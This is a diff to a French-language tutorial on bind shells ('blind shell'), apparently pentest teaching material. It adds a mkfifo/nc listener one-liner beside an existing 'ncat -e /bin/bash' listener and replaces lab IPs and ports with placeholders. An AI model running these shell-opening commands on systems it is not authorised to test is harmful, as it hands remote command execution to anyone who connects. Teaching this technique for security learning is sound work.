@@ -87,19 +87,23 @@ Un **blind shell** est ce qui se produit quand une cible va **démarrer un liste
 Machine cible
 
 ```shell
-user@raspberrypi:~$ ncat -vnlp 4433 -e /bin/bash
+user@raspberrypi:~$ ncat -vnlp <PORT> -e /bin/bash
 Ncat: Version 7.80 ( https://nmap.org/ncat )
 Ncat: Listening on :::4433
 Ncat: Listening on 0.0.0.0:4433
 Ncat: Connection from 192.168.1.100.
 Ncat: Connection from 192.168.1.100:57085.
 ```
+ou
+```shell
+user@raspberrypi:~$ mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+```
 **Lancement du serveur netcat**.
 
 Notre machine
 
 ```shell
-user@ip:~$ ncat 192.168.1.104 4433
+user@ip:~$ ncat <IP-CIBLE> <PORT>
 ls
 Bookshelf
 Desktop
